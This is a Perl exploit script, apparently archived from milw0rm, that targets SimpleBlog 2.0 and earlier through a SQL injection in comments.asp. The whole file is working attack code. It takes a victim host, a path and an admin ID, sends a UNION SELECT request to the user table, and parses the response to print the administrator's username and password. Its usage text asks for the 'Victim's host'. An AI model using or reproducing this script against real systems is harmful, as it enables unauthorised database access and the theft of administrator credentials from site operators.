<html><head><title>SimpleBlog <= 2.0 (comments.asp) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#Method found by Chironex Fleckeri 
#Exploit By ASIANEAGLE
#Contact:admin@asianeagle.org
#Original advisory: http://www.milw0rm.com/exploits/2228
#Usage: exploitname.pl &lt;host&gt; &lt;path&gt; &lt;id&gt;
use IO::Socket;
if(@ARGV != 3) { usage(); }
else { exploit(); }
sub header()
{
  print &quot; *****SimpleBlog 2.0 SQL Injection Exploit***** \r\n&quot;;
  print &quot;      *****www.asianeagle.org***** \r\n&quot;;
  }
sub usage() 
{
  header();
  print &quot; *Usage: $0 &lt;host&gt; &lt;path&gt; &lt;id&gt;\r\n&quot;;
  print &quot; *&lt;host&gt; = Victim's host ex: www.site.com\r\n&quot;;
  print &quot; *&lt;path&gt; = SimpleBlog Path ex: /SimpleBlog/\r\n&quot;;
  print &quot; *&lt;id&gt;   = Admin ID ex: 1\r\n&quot;;
  exit();
}
sub exploit () 
{
  $simserver = $ARGV[0];
  $simserver =~ s/(http:\/\/)//eg;
  $simhost   = &quot;http://&quot;.$simserver;
  $simdir    = $ARGV[1];
  $simport   = &quot;80&quot;;
  $simtar    = &quot;comments.asp?id=&quot;;
  $simsql    = &quot;-1%20UNION%20SELECT%20ID,uFULLNAME,uUSERNAME,uPASSWORD,uEMAIL,uDATECREATED,null,null%20FROM%20T_USERS%20WHERE%20id%20like%20&quot;.$ARGV[2];
  $simreq    = $simhost.$simdir.$simtar.$simsql;
 
  header();
  print &quot;- Trying to connect: $simserver\r\n&quot;;
  $sim = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$simserver&quot;, PeerPort =&gt; &quot;$simport&quot;) || die &quot;- Connection failed...\n&quot;;
  print $sim &quot;GET $simreq HTTP/1.1\n&quot;;
  print $sim &quot;Accept: */*\n&quot;;
  print $sim &quot;Referer: $simhost\n&quot;;
  print $sim &quot;Accept-Language: tr\n&quot;;
  print $sim &quot;User-Agent: Mozzilla\n&quot;;
  print $sim &quot;Cache-Control: no-cache\n&quot;;
  print $sim &quot;Host: $simserver\n&quot;;
  print $sim &quot;Connection: close\n\n&quot;;
  print &quot;Connected...\r\n&quot;;
  while ($answer = &lt;$sim&gt;) {
    if ($answer =~ /class=\&quot;c_content\&quot;&gt;(.*?)&lt;\/td&gt;&lt;\/tr&gt;/) { 
      if ($1 == $ARGV[2]) {
        print &quot;Seems Vulnerable :)\r\n&quot;;
      }
      else { die &quot;- Exploit failed\n&quot;; }     
    }
    if ($answer =~ /class=\&quot;c_content\&quot;&gt;&lt;b&gt;(.*)&lt;\/b&gt;/) {
      print &quot;- Username: $1\r\n&quot;;
    }
    if ($answer =~ /href=\&quot;mailto:(.*?)\&quot;&gt;(.*?)&lt;\/a&gt;/) {
	  print &quot;- Password: $1\r\n&quot;;
    }  
  }
  
 
 
}

# milw0rm.com [2006-08-20]</pre></html>